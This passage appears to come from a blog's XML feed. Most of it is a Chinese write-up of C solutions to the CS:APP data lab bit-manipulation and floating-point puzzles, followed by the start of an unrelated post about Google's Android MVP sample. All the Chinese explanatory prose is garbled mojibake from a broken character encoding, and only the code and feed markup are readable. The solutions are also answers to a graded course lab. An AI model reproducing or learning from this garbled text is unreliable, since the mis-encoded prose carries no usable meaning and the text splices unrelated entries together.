(result &gt;&gt; 24)) &amp; 0xff;&#125; bang è¦æ±‚ï¼šä¸ä½¿ç”¨!å®žçŽ°!æ“ä½œç¬¦ æ“ä½œç¬¦é™åˆ¶ï¼š~ &amp; ^ | + &lt;&lt; &gt;&gt; æ“ä½œç¬¦ä½¿ç”¨æ•°é‡é™åˆ¶ï¼š12 æ€è·¯ï¼š !æ“ä½œç¬¦çš„å«ä¹‰æ˜¯0å˜ä¸º1ï¼Œéž0å˜ä¸º0ï¼Œæˆ‘ä»¬è‡ªç„¶å¯ä»¥æƒ³åˆ°è¦åšçš„æ˜¯åŒºåˆ†éžé›¶å’Œé›¶ï¼Œé›¶ç›¸å¯¹çš„éžé›¶æ•°æœ‰ä¸€ä¸ªéžå¸¸æ˜Žæ˜¾çš„ç‰¹å¾æ˜¯-0=0ï¼Œè€Œå¯¹äºŽéžé›¶æ•°ï¼Œå–è´ŸåŽå¿…å®šæ˜¯ä¸€æ­£ä¸€è´Ÿè€Œä¸å¯èƒ½ç›¸ç­‰ï¼Œåˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œå¯ä»¥å¾—å‡ºéžé›¶æ•°ä¸Žå®ƒçš„ç›¸åæ•°è¿›è¡Œ|è¿ç®—åŽç¬¦å·ä½ä¸€å®šä¸º1ï¼Œæˆ‘ä»¬å°†ç¬¦å·ä½å–å‡ºå¹¶å–åå°±å¯ä»¥è¿”å›žæ­£ç¡®çš„å€¼ã€‚ 1int bang(int x) &#123; return 1 &amp; (1 ^ ((x | (~x + 1)) &gt;&gt; 31)); &#125; tmin è¦æ±‚ï¼šè¿”å›žè¡¥ç è¡¨ç¤ºçš„æ•´åž‹çš„æœ€å°å€¼ æ“ä½œç¬¦ä½¿ç”¨æ•°é‡é™åˆ¶ï¼š4 æ€è·¯ï¼šæŒ‰ç…§è¡¥ç çš„æƒå€¼ç†è§£ï¼Œåªè¦å°†æƒä¸º-32çš„ä½ç½®ä¸º1å³å¯ 1int tmin(void) &#123; return 1 &lt;&lt; 31; &#125; fitBits è¦æ±‚ï¼šå¦‚æžœxå¯ä»¥låªç”¨nä½è¡¥ç è¡¨ç¤ºåˆ™è¿”å›ž1ï¼Œå¦åˆ™è¿”å›ž0 1 &lt;= n &lt;= 32 æ“ä½œç¬¦ä½¿ç”¨æ•°é‡é™åˆ¶ï¼š15 æ€è·¯ï¼š å¦‚æžœxå¯ä»¥ç”¨nä½è¡¥ç è¡¨ç¤ºï¼Œé‚£ä¹ˆå·¦ç§»å¤šä½™çš„ä½çš„ä¸ªæ•°åŽå†å³ç§»å›žæ¥çš„æ•°å€¼ä¸€å®šä¸ŽåŽŸå€¼ç›¸ç­‰ï¼Œè¿™ä¸ªæ–¹æ³•åˆ©ç”¨äº†å·¦ç§»åŽæº¢å‡ºçš„ä½ä¼šè¢«ä¸¢å¼ƒï¼Œè€Œå³ç§»å›žæ¥æ—¶çš„æ˜¯è¡¥ç¬¦å·ä½ï¼Œå¦‚æžœä¸¢å¼ƒäº†1æˆ–è€…å³ç§»æ—¶è¡¥çš„æ˜¯1éƒ½ä¼šå¯¼è‡´å€¼çš„æ”¹å˜ï¼Œè€Œè¿™ä¸¤ç§æƒ…å†µä¹Ÿæ­£è¯´æ˜Žäº†xä¸å¯ä»¥åªç”¨nä½è¡¥ç è¡¨ç¤ºã€‚ 1234int fitsBits(int x, int n) &#123; int a = 33 + ~n; return !((x &lt;&lt; a &gt;&gt; a) ^ x);&#125; divpwr2 è¦æ±‚ï¼šè®¡ç®—x/(2^n) 0 &lt;= n &lt;= 30 ç»“æžœå‘é›¶å–æ•´ æ“ä½œç¬¦ä½¿ç”¨æ•°é‡é™åˆ¶ï¼š15 æ€è·¯ï¼šå¯¹äºŽæ­£æ•°ï¼Œæˆ‘ä»¬ç›´æŽ¥æŠŠxå³ç§»nä½å°±å¯ä»¥å¾—åˆ°å‘é›¶å–æ•´çš„ç»“æžœï¼ˆå®žé™…ä¸Šæ˜¯å‘ä¸‹å–æ•´ï¼‰ï¼›å¯¹äºŽè´Ÿæ•°ï¼Œè™½ç„¶æˆ‘ä»¬å³ç§»nä½å¯ä»¥å¾—åˆ°ç»“æžœï¼Œä½†æ˜¯è¿™ä¸ªç»“æžœæ˜¯å‘ä¸‹å–æ•´çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦é€‚å½“åœ°åŠ ä¸Š1æ¥è¡¥ä¸ºå‘é›¶å–æ•´ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä»€ä¹ˆæ—¶å€™éœ€è¦åŠ 1å‘¢ï¼Ÿæ•´é™¤æ—¶å½“ç„¶ä¸ç”¨ï¼Œåœ¨ä¸èƒ½æ•´é™¤æ—¶å°±éƒ½éœ€è¦åŠ ä¸Š1æ¥è°ƒæ•´ï¼Œå¦‚ä½•åˆ¤æ–­æ˜¯å¦æ•´é™¤ï¼Ÿåªè¦ç§»å‡ºçš„ä½ä¸­æœ‰ä¸€ä¸ªä¸ä¸º0ï¼Œé‚£ä¹ˆå°±è¡¨ç¤ºæ— æ³•æ•´é™¤ã€‚â€‹123456int divpwr2(int x, int n) &#123; int a = 1 &lt;&lt; 31; int isALessThanZero = !!(x &amp; a); int isXHasMoreBit = (!!((~(a &gt;&gt; (32 + ~n))) &amp; x)); return (x &gt;&gt; n) + (isXHasMoreBit &amp; isALessThanZero);&#125; negate è¦æ±‚ï¼šè®¡ç®—-x æ“ä½œç¬¦ä½¿ç”¨æ•°é‡é™åˆ¶ï¼š5 æ€è·¯ï¼šç•¥ã€‚1int negate(int x) &#123; return ~x + 1; &#125; isPositive è¦æ±‚ï¼šå¦‚æžœxå¤§äºŽ0è¿”å›ž1ï¼Œå¦åˆ™è¿”å›ž0 æ“ä½œç¬¦ä½¿ç”¨æ•°é‡é™åˆ¶ï¼š8 æ€è·¯ï¼šæ£€æµ‹ç¬¦å·ä½ä¸Žxæ˜¯å¦ä¸º0å³å¯ã€‚1int isPositive(int x) &#123; return !((x &amp; (1 &lt;&lt; 31)) | !x); &#125; isLessOrEqual è¦æ±‚ï¼šå¦‚æžœxå°äºŽç­‰äºŽyåˆ™è¿”å›ž1ï¼Œå¦åˆ™è¿”å›ž0 æ“ä½œç¬¦ä½¿ç”¨æ•°é‡é™åˆ¶ï¼š24 æ€è·¯ï¼šæœ¬é¢˜çš„åŸºæœ¬æ€è·¯æ˜¯åˆ¤æ–­x-yå¾—åˆ°çš„å€¼æ˜¯å¦å°äºŽç­‰äºŽ0ï¼Œä½†æ˜¯è¦è€ƒè™‘æº¢å‡ºå¸¦æ¥çš„å½±å“ï¼Œé¦–å…ˆå®šä¹‰äº†ä¸¤ä¸ªå˜é‡xp,ypåˆ†åˆ«è¡¨ç¤ºx,yæ˜¯å¦å¤§äºŽç­‰äºŽ0ã€‚returnçš„è¡¨è¾¾å¼çš„å«ä¹‰ä¸ºå¹¶å¹¶éžxå¤§äºŽç­‰äºŽ0ä¸”yå°äºŽ0çš„æƒ…å†µä¸‹ï¼ˆ&amp;çš„åŽåŠéƒ¨åˆ†ï¼‰ï¼Œå¦‚æžœx-yå°äºŽæˆ–ç­‰äºŽ0æˆ–xå°äºŽé›¶ä¸”yå¤§äºŽç­‰äºŽ0ï¼Œåˆ™è¿”å›ž1ã€‚1234567int isLessOrEqual(int x, int y) &#123; int t = 1 &lt;&lt; 31; int xp = !(x &amp; t); int yp = !(y &amp; t); int p = x + ~y + 1; return (!!(((!xp) &amp; yp) | ((p &amp; t) | !p))) &amp; (!(xp &amp; (!yp)));&#125; ilog2 è¦æ±‚ï¼šè¿”å›žxæ±‚ä»¥2ä¸ºåº•çš„å¯¹æ•°çš„ç»“æžœ å‘ä¸‹å–æ•´ æ“ä½œç¬¦ä½¿ç”¨æ•°é‡é™åˆ¶ï¼š90 æ€è·¯ï¼šæœ¬é¢˜å‚ç…§äº†é™ˆå¿—æµ©å­¦é•¿çš„ç­”æ¡ˆã€‚è§£é¢˜ç®—æ³•çš„æ ¸å¿ƒæ€æƒ³æ˜¯äºŒåˆ†æŸ¥æ‰¾ï¼Œé¦–å…ˆæˆ‘ä»¬è¦æ˜Žç™½è¿™é“é¢˜å®žé™…ä¸Šæƒ³è®©æˆ‘ä»¬æ±‚çš„æ˜¯ä»€ä¹ˆï¼Œç»è¿‡è§‚å¯Ÿæˆ‘ä»¬å¯ä»¥å¾—å‡ºç»“è®ºï¼Œä¸€ä¸ªæ•°æ±‚ä»¥2ä¸ºåº•çš„å¯¹æ•°çš„ç»“æžœå°±ç›¸å½“äºŽå®ƒäºŒè¿›åˆ¶ä¸­ä½ç½®æœ€é«˜çš„1çš„åºå·ï¼ˆåºå·ä»Žé›¶å¼€å§‹ç”±ä½Žä½åˆ°é«˜ä½ï¼‰ã€‚é‚£ä¹ˆæˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯æŸ¥æ‰¾å¹¶è®°å½•è¿™ä¸ªä½ç½®æœ€é«˜çš„1çš„ä½ç½®ã€‚ç®—æ³•è¿‡ç¨‹å¦‚ä¸‹ï¼š å¦‚æžœx &gt;&gt; 16çš„ç»“æžœå¤§äºŽ0ï¼Œé‚£ä¹ˆå¯ä»¥è¯´æ˜Žæœ€é«˜ä½çš„ä½ç½®è‡³å°‘æ˜¯16ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°†ç»“æžœçš„ç¬¬4ä½ç½®1ï¼ˆåºå·ç¼–å·è§„åˆ™åŒä¸Šï¼‰ï¼Œå› ä¸º2 ^ 4 = 16ï¼Œåä¹‹ç½®0è¯´æ˜Žç»“æžœå°äºŽ16. ä¸‹é¢è€ƒè™‘ä¸¤ç§æƒ…å†µï¼Œå¦‚æžœç¬¬1æ­¥ä¸­x &gt;&gt; 16 å¤§äºŽ0ï¼Œè¯´æ˜Žæˆ‘ä»¬éœ€è¦åœ¨16ä½ä¹‹åŽçš„ç¬¬8ä½ï¼ˆç¬¬24ä½ï¼Œç›¸å½“äºŽå†äºŒåˆ†ï¼‰å†è¿›è¡ŒäºŒåˆ†æŸ¥æ‰¾ï¼Œå¦‚æžœx &gt;&gt; 16å°äºŽ0ï¼Œé‚£æˆ‘ä»¬éœ€è¦åœ¨16ä½ä¹‹å‰çš„ç¬¬8ä½ï¼ˆç¬¬8ä½ï¼Œç›¸å½“äºŽå†äºŒåˆ†ï¼‰è¿›è¡ŒæŸ¥æ‰¾ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å¾—å‡ºï¼Œä¸‹æ¬¡æŸ¥æ‰¾æ—¶çš„èŒƒå›´ä¸ºx &gt;&gt; (8 + result) (resultè¡¨ç¤ºä¸Šä¸€æ­¥å¾—åˆ°çš„ç»“æžœï¼ˆ0æˆ–16ï¼‰)ï¼Œè¿™ä¸ª+resultçš„æ„ä¹‰å¯ä»¥è®¤ä¸ºæ˜¯é‡æ–°ç¡®å®šå¼€å§‹è¿›ä¸€æ­¥äºŒåˆ†æŸ¥æ‰¾çš„ä½ç½®ã€‚å¦‚æžœx &gt;&gt; (8 + result) çš„ç»“æžœå¤§äºŽ0ï¼Œé‚£ä¹ˆè¯´æ˜Žç»“æžœï¼ˆresult)çš„ç¬¬3ä½å¿…ä¸º1ï¼Œç›¸å½“äºŽåœ¨ç»“æžœä¸ŠåŠ ä¸Šäº†æŸ¥æ‰¾åˆ°çš„æ–°ä½ç½®ï¼Œåä¹‹ç¬¬3ä½åº”è¯¥ä»ä¸º0. æŒ‰ç…§ä¸Šé¢çš„æ€è·¯ç»§ç»­æŸ¥æ‰¾åˆ°ä¸èƒ½å†äºŒåˆ†ï¼ˆåç§»ä¸ºx &gt;&gt; (1 + reuslt)ï¼‰ï¼Œæ­¤æ—¶resultä¸­å¾—åˆ°æœ€ç»ˆçš„æœ€é«˜ä½çš„ä½ç½®ã€‚ç®—æ³•æè¿°èµ·æ¥æ¯”è¾ƒéš¾ï¼Œå‚ç…§ä»£ç æŽ¨ç†å‡ æ¬¡å°±å¯ä»¥æ˜Žç™½å…¶ä¸­çš„å·§å¦™ä¹‹å¤„ï¼š123456789101112131415161718int ilog2(int x) &#123; int result = 0; int b4 = !!(x &gt;&gt; 16); int b3 = 0; int b2 = 0; int b1 = 0; int b0 = 0; result = b4 &lt;&lt; 4; b3 = !!(x &gt;&gt; (8 + result)); result = result | (b3 &lt;&lt; 3); b2 = !!(x &gt;&gt; (4 + result)); result = result | (b2 &lt;&lt; 2); b1 = !!(x &gt;&gt; (2 + result)); result = result | (b1 &lt;&lt; 1); b0 = !!(x &gt;&gt; (1 + result)); result = result | b0; return result;&#125; ç¬¬äºŒéƒ¨åˆ† æµ®ç‚¹æ•°æ‰€ç¼–å†™çš„ç¨‹åºå¿…é¡»æ»¡è¶³å¦‚ä¸‹è¦æ±‚ï¼š åªèƒ½ä½¿ç”¨å‡½æ•°å‚æ•°ä¸Žå‡½æ•°å†…å£°æ˜Žçš„å±€éƒ¨å˜é‡ æœ€å¤šåªèƒ½ä½¿ç”¨æœ‰é™ä¸ªè¿ç®—ç¬¦ï¼ˆç­‰äºŽå·ã€æ‹¬å·ä¸è®¡ï¼‰ï¼Œå¯ä»¥è®¤ä¸ºä½¿ç”¨çš„è¿ç®—ç¬¦ä¸ªæ•°è¶Šå°‘å¾—åˆ†è¶Šé«˜ ç¦æ­¢å®šä¹‰æˆ–ä½¿ç”¨ä»»ä½•å® ç¦æ­¢å®šä¹‰ä»»ä½•å‡½æ•° ç¦æ­¢è°ƒç”¨ä»»ä½•å‡½æ•°ï¼ˆé™¤äº†å¯ä»¥ä½¿ç”¨printfè¾“å‡ºä¸­é—´å˜é‡ï¼Œä½†æäº¤æ—¶å¿…é¡»åŽ»æŽ‰ï¼‰ ç¦æ­¢ä½¿ç”¨ä»»ä½•å½¢å¼çš„ç±»åž‹è½¬æ¢ ç¦æ­¢ä½¿ç”¨intã€unsignedä»¥å¤–çš„ä»»ä½•ç±»åž‹ï¼ˆåŒ…æ‹¬ç»“æž„ä½“ã€æ•°ç»„ã€è”åˆä½“ï¼‰ ç¦æ­¢å®šä¹‰æˆ–ä½¿ç”¨ä»»ä½•æµ®ç‚¹å¸¸é‡ ä¹Ÿå°±æ˜¯è¯´åœ¨æµ®ç‚¹æ•°é¢˜ç›®ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»»æ„å¤§å°çš„æ•´åž‹æ•°å€¼ï¼Œå¯ä»¥ä½¿ç”¨æµç¨‹æŽ§åˆ¶è¯­å¥ï¼Œå¯ä»¥ä½¿ç”¨ä»»ä½•æ“ä½œç¬¦ã€‚ float_neg è¦æ±‚ï¼šè¿”å›ž-fçš„ä½çº§è¡¨ç¤º æœ¬é¢˜åŠä»¥ä¸‹æ‰€æœ‰çš„é¢˜ç›®éƒ½é‡‡ç”¨unsigned intæ¥å­˜æ”¾ä½çº§è¡¨ç¤º æ‰€æœ‰çš„æµ®ç‚¹ç±»åž‹éƒ½ä¸ºfloat å¦‚æžœè¾“å…¥ä¸ºNaNï¼Œè¿”å›žNaN æ“ä½œç¬¦ä½¿ç”¨æ•°é‡é™åˆ¶ï¼š10 æ€è·¯ï¼šå¯¹äºŽä¸€èˆ¬çš„æµ®ç‚¹æ•°ï¼Œæˆ‘ä»¬åªéœ€è¦å¯¹å®ƒçš„ç¬¦å·ä½å–åå°±å¯ä»¥äº†ã€‚éœ€è¦ç‰¹æ®Šå¤„ç†çš„åªæ˜¯æ— ç©·ä¸ŽNaNè¿™ä¸¤ç§éžè§„æ ¼åŒ–çš„æƒ…å†µ 1234567unsigned float_neg(unsigned uf) &#123; unsigned result = uf ^ 0x80000000; if ((uf &amp; 0x7F800000) == 0x7F800000 &amp;&amp; (uf &amp; 0x007FFFFF)) &#123; result = uf; &#125; return result;&#125; float_i2f è¦æ±‚ï¼šå®žçŽ°ç”±intåˆ°floatçš„ç±»åž‹è½¬æ¢ æ“ä½œç¬¦ä½¿ç”¨æ•°é‡é™åˆ¶ï¼š30 æ€è·¯ï¼š ç”±äºŽæµ®ç‚¹æ•°çš„è¡¨ç¤ºä¸­å¯¹äºŽè´Ÿæ•°å¹¶æ²¡æœ‰ä½¿ç”¨è¡¥ç çš„æ–¹å¼ï¼Œæ­£è´Ÿå·å®Œå…¨å–å†³äºŽç¬¦å·ä½ï¼Œæ‰€ä»¥å¯¹äºŽè´Ÿæ•°è¾“å…¥ï¼Œæˆ‘ä»¬éœ€è¦åšçš„ç¬¬ä¸€æ­¥å·¥ä½œå°±æ˜¯æŠŠå®ƒå–è´Ÿä¸ºæ­£æ•°å†è¿›è¡ŒåŽé¢çš„æ“ä½œã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹æˆ‘ä»¬éœ€è¦è®°å½•ä¸‹æ­£è´Ÿï¼Œåœ¨ä¹‹åŽçš„æ“ä½œä¸­éœ€è¦ä½¿ç”¨ã€‚ ç”±äºŽæµ®ç‚¹æ•°ä¸Žæ•´æ•°è¡¨ç¤ºçš„ä¸åŒï¼Œæµ®ç‚¹æ•°çš„æœ‰æ•ˆæ•°å­—çš„ä½ç½®åœ¨ç¬¬0-22ä½çš„23ä½ä¸­ï¼Œå¹¶ä¸”ç¬¬ä¸€ä¸ª1åœ¨è§„æ ¼åŒ–è¡¨ç¤ºä¸­ä¼šè¢«çœç•¥ï¼Œæˆ‘ä»¬åªéœ€è¦ç¬¬ä¸€ä¸ª1ä»¥åŽçš„ä½æ•°ï¼Œå¹¶ä¸”æˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨æµ®ç‚¹æ•°è¡¨ç¤ºä¸­å®ƒçš„æŒ‡æ•°åº”è¯¥ä¸ºå¤šå°‘ï¼Œæ‰€ä»¥åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­æˆ‘ä»¬åŒæ—¶éœ€è¦è®°å½•ç¬¬ä¸€ä¸ª1å‡ºçŽ°çš„ä½ç½®å¹¶ä»¥æ­¤å†³å®šæŒ‡æ•°ã€‚ åœ¨ä»£ç ä¸­ä½¿ç”¨äº†ä¸€ä¸ªiæ¥è®°å½•å·¦ç§»çš„ä½æ•°ï¼Œä¹Ÿå°±æ˜¯æœ€é«˜ä½çš„1ä¹‹å‰çš„é›¶çš„ä¸ªæ•°ï¼Œé‚£ä¹ˆ32-iå°±æ˜¯æœ€åŽçš„æŒ‡æ•°ã€‚ åœ¨å¾ªçŽ¯ä¸­æˆ‘ä»¬å°†æ•´æ•°çš„æœ‰æ•ˆæ•°å­—æå‰åˆ°äº†æœ€å‰ï¼Œç„¶åŽå°†æœ€é«˜ä½ç§»å‡ºï¼Œ è¿™æ—¶æˆ‘ä»¬ç”¨tempä¿å­˜è¿™æ—¶çš„çŠ¶æ€ã€‚ä¾›ä¹‹åŽçš„èˆå…¥åˆ¤æ–­ä½¿ç”¨ã€‚ æŽ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦å°†æœ‰æ•ˆä½ç§»åˆ°æ­£ç¡®çš„ä½ç½®ä¸Šï¼Œä¹Ÿå°±æ˜¯å‘å³ä½ç§»9ä½ã€‚ ä¸‹é¢æŒ‰ç…§ä¹‹å‰çš„è®°å½•æŠŠç¬¦å·ä½ç½®ä¸Šæ­£ç¡®çš„å€¼ã€‚ çŽ°åœ¨å·²ç»å¤„ç†å¥½æœ‰æ•ˆæ•°å­—ä¸Žç¬¦å·éƒ¨åˆ†ï¼Œä¸‹é¢è¦åšçš„å°±æ˜¯å¤„ç†æŒ‡æ•°éƒ¨åˆ†ã€‚ ä¹‹å‰è¯´è¿‡32-iæ˜¯æŒ‡æ•°çš„æ•°å€¼ï¼Œæ³¨æ„æˆ‘ä»¬éœ€è¦å°†è¿™ä¸ªå€¼åŠ ä¸Šåç§»é‡127ï¼Œå†æ”¾å…¥è¡¨ç¤ºæŒ‡æ•°çš„ä½ç½®ä¸­ã€‚ ä¸‹é¢å°±è¦å¤„ç†èˆå…¥çš„æƒ…å†µäº†ï¼Œæµ®ç‚¹æ•°è¡¨ç¤ºçš„èˆå…¥è§„åˆ™æ¯”è¾ƒç‰¹æ®Šï¼Œä¹Ÿæ˜¯æœ¬é¢˜çš„éš¾ç‚¹ã€‚ç»“åˆæœ¬é¢˜çš„æƒ…å†µè¿›è¡Œä»‹ç»ï¼š åœ¨å³ç§»ä¹‹å‰æˆ‘ä»¬ä¿å­˜äº†è¿™æ—¶çš„çŠ¶æ€ï¼Œå› ä¸ºå½“å³ç§»ä¹ä½åŽåŽŸæ¥çš„ä½Žä¹ä½å¦‚æžœæœ‰æ•°æ®å°±ä¼šè¢«èˆå¼ƒï¼Œæˆ‘ä»¬å°±éœ€è¦æ ¹æ®èˆå¼ƒçš„è¿™ä¹ä½ä¸Žæœªè¢«èˆå¼ƒçš„æœ€åŽä¸€ä½ï¼ˆä¹Ÿå°±æ˜¯åŽŸæ•°ç¬¬9ä½ï¼Œä¸‹ç§°ç¬¬9ä½ï¼‰æ¥åˆ¤æ–­èˆå…¥çš„æƒ…å†µã€‚ å¦‚æžœèˆå¼ƒçš„è¿™ä¹ä½çš„æœ€é«˜ä½ä¸º0ï¼Œé‚£ä¹ˆè¯´æ˜ŽèˆåŽ»çš„æ•°å€¼å°äºŽä¿ç•™ä¸‹æ¥çš„æœ€ä½Žä½è¡¨ç¤ºçš„å€¼çš„äºŒåˆ†ä¹‹ä¸€ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸éœ€è¦èˆå…¥ã€‚ å¦‚æžœèˆå¼ƒçš„è¿™ä¹ä½çš„æœ€é«˜ä½ä¸º1ï¼Œå¹¶ä¸”åŽé¢çš„ä½æœ‰æ•°å€¼ï¼Œé‚£ä¹ˆè¯´æ˜ŽèˆåŽ»çš„æ•°å€¼å¤§äºŽç¬¬9ä½è¡¨ç¤ºçš„å€¼çš„äºŒåˆ†ä¹‹ä¸€ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬éœ€è¦èˆå…¥ï¼Œä¹Ÿå°±æ˜¯æŠŠæœ€ç»ˆç»“æžœåŠ ä¸€ã€‚ å¦‚æžœèˆå¼ƒçš„è¿™ä¹ä½çš„æœ€é«˜ä½ä¸º1ï¼Œå¹¶ä¸”åŽé¢çš„ä½éƒ½æ˜¯0ï¼Œè¿™ä¸ªæ—¶å€™æ­£å¥½å°±æ˜¯ç¬¬9ä½è¡¨ç¤ºçš„å€¼çš„äºŒåˆ†ä¹‹ä¸€ã€‚é‚£ä¹ˆè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±è¦çœ‹ç¬¬9ä½ï¼Œå¦‚æžœç¬¬9ä½ä¸º0ï¼Œé‚£ä¹ˆä¸èˆå…¥ã€‚å¦‚æžœç¬¬9ä½ä¸º1ï¼Œé‚£ä¹ˆè¿›è¡Œèˆå…¥ï¼Œä¹Ÿå°±æ˜¯æŠŠæœ€ç»ˆç»“æžœåŠ ä¸€ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940unsigned float_i2f(int x) &#123; int i = 1; int nega = 0; unsigned temp; unsigned result; if (x &amp; 0x80000000) &#123; nega = 1; x = ~x + 1; &#125; if (x == 0) &#123; return 0; &#125; while ((x &amp; 0x80000000) != 0x80000000) &#123; ++i; x &lt;&lt;= 1; &#125; result = x &lt;&lt; 1; temp = result; result &gt;&gt;= 9; if (nega) &#123; result |= 0x80000000; &#125; else &#123; result &amp;= 0x7FFFFFFF; &#125; i = (32 - i) + 127; result = (result &amp; 0x807FFFFF) | (i &lt;&lt; 23); if ((temp &amp; 0x00000100) == 0x00000100) &#123; if (temp &amp; 0x000000FF) &#123; return result + 1; &#125; else &#123; if (result &amp; 1) &#123; return result + 1; &#125; else &#123; return result; &#125; &#125; &#125; return result;&#125; float_twice è¦æ±‚ï¼šè¿”å›ž2*fçš„ä½çº§è¡¨ç¤º æ“ä½œç¬¦ä½¿ç”¨æ•°é‡é™åˆ¶ï¼š30 æ€è·¯ï¼š å¦‚æžœè¯¥æµ®ç‚¹æ•°æ˜¯éžè§„æ ¼åŒ–çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦å°†å®ƒçš„æœ‰æ•ˆæ•°å­—éƒ¨åˆ†å·¦ç§»ä¸€ä½å°±å¯ä»¥è¾¾åˆ°ä¹˜äºŒçš„æ•ˆæžœï¼Œè¿™ä¸ªè¿‡ç¨‹éœ€è¦æ³¨æ„ä¸¤ä¸ªåœ°æ–¹ï¼Œç¬¬ä¸€æ˜¯å¦‚æžœå·¦ç§»åŽå¦‚æžœæœ‰æ•ˆæ•°å­—çš„æœ€é«˜ä½æº¢å‡ºäº†ï¼Œé‚£ä¹ˆæ­£å¥½ç§»åˆ°äº†æŒ‡æ•°éƒ¨åˆ†æˆä¸ºäº†ä¸€ä¸ªè§„æ ¼åŒ–çš„è¡¨ç¤ºå½¢å¼ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— éœ€æ‹…å¿ƒå·¦ç§»åŽæœ‰æ•ˆæ•°å­—æº¢å‡ºçš„é—®é¢˜ã€‚ç¬¬äºŒæ˜¯å·¦ç§»åŽä¼šå¯¼è‡´ç¬¦å·ä½è¢«ç§»å‡ºï¼Œæˆ‘ä»¬éœ€è¦åœ¨ä½ç§»ä¹‹åŽæ‰‹åŠ¨ç½®ä¸ŠåŽŸæ¥çš„ç¬¦å·ä½ã€‚ å¦‚æžœè¯¥æµ®ç‚¹æ•°æ˜¯è§„æ ¼åŒ–çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦å°†å®ƒçš„æŒ‡æ•°éƒ¨åˆ†åŠ ä¸€ã€‚ å…¶ä»–æƒ…å†µçš„åº”è¯¥ç›´æŽ¥è¿”å›žåŽŸå€¼ã€‚ 123456789unsigned float_twice(unsigned uf) &#123; unsigned result = uf; if ((uf &amp; 0x7f800000) == 0) &#123; result = ((uf &amp; 0x007fffff) &lt;&lt; 1) | (uf &amp; 0x80000000); &#125; else if ((uf &amp; 0x7f800000) != 0x7f800000) &#123; result = uf + 0x00800000; &#125; return result;&#125; å®žéªŒå°ç»“ä½œä¸ºCS:APPçš„ç¬¬ä¸€ä¸ªlabï¼Œç»å¤§éƒ¨åˆ†çš„é¢˜ç›®åœ¨ç»è¿‡ä»”ç»†æ€è€ƒä¸Žæµ‹è¯•åŽæ˜¯å¯ä»¥è‡ªä¸»å®Œæˆçš„ï¼Œä½†æ˜¯å…¶ä¸­çš„bitCountä¸Žilog2ç”±äºŽéœ€è¦ä½¿ç”¨åˆ†æ²»ä¸ŽäºŒåˆ†æŸ¥æ‰¾çš„ç®—æ³•ï¼Œè‡ªå·±æƒ³å‡ºæ¥çš„éš¾åº¦è¿˜æ˜¯æ¯”è¾ƒå¤§çš„ï¼Œåœ¨å¡äº†ä¸¤å¤©ä»¥åŽè¿˜æ˜¯åŽ»æŸ¥äº†ç­”æ¡ˆã€‚]]></content>
      <categories>
        <category>Computer System</category>
        <category>CS:APP</category>
      </categories>
      <tags>
        <tag>Computer System</tag>
        <tag>CS:APP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android Googleå®˜æ–¹MVPæž¶æž„åˆ†æž]]></title>
    <url>%2F2017%2F05%2F25%2Fandroid_google_mvp%2F</url>
    <content type="text"><![CDATA[å†™åœ¨å‰é¢å…³äºŽMVPæ¨¡å¼çš„åŸºæœ¬ä»‹ç»ä¸Žä¼˜ç¼ºç‚¹å¯ä»¥å‚è§ä¸‹é¢è¿™ç¯‡æ–‡ç« ï¼š https://segmentfault.com/a/1190000003927200 æœ¬æ–‡çš„é‡ç‚¹æ˜¯å¯¹Googleå®˜æ–¹å†™çš„ä¸€ä¸ªMVPæž¶æž„å®žçŽ°çš„Demoè¿›è¡Œç®€å•çš„åˆ†æžæ¥çœ‹çœ‹è°·æ­Œå®žçŽ°çš„Android MVPæž¶æž„æ˜¯æ€Žä¹ˆæ­å»ºçš„ã€‚ è°·æ­Œå®˜æ–¹çš„æž¶æž„Demoåœ°å€ï¼š https://github.com/googlesamples/android-architecture æœ¬æ–‡æ‰€è®²è§£çš„ä¸ºï¼š https://github.com/googlesamples/android-architecture/tree/todo-mvp éœ€è¦è¯»è€…å‚ç…§æºç æŸ¥çœ‹æœ¬æ–‡ã€‚ æˆ‘å°†è¿™ä¸ªtodoåº”ç”¨çš„æ¡†æž¶æç‚¼å‡ºæ¥ï¼ˆåŒæ—¶ä¹Ÿæ„å‘³ç€ä¸¢å¤±äº†å¾ˆå¤šçš„å®žçŽ°ç»†èŠ‚ï¼Œä½†å¯ä»¥å°†æž¶æž„çœ‹å¾—æ›´åŠ æ¸…æ™°ï¼‰ï¼Œåˆ¶ä½œäº†ä¸€å¼ ä¼ªUMLå›¾ï¼ˆä¸ºäº†ç®€åŒ–ï¼Œæ²¡æœ‰éµå¾ªUMLçš„è§„èŒƒï¼‰ï¼Œä¸‹é¢æˆ‘ä»¬å‚ç…§ç€è¡¨ä¸­çš„å†…å®¹è¿›è¡Œåˆ†æžï¼š BaseViewä¸ŽBasePresenterå¯ä»¥çœ‹åˆ°å®ƒä»¬æ˜¯ç‹¬ç«‹äºŽåŒ…å¤–çš„ä¸¤ä¸ªåŸºç¡€æŽ¥å£ï¼Œä¹‹åŽçš„æ‰€æœ‰Viewä¸ŽPresenteræŽ¥å£éƒ½å°†ç»§æ‰¿å®ƒä»¬ï¼Œæ‰€ä»¥åº”è¯¥å°†ä¸€äº›é€šç”¨çš„æ–¹æ³•å†™åœ¨è¿™ä¸¤ä¸ªBaseæŽ¥å£ä¸­ã€‚ 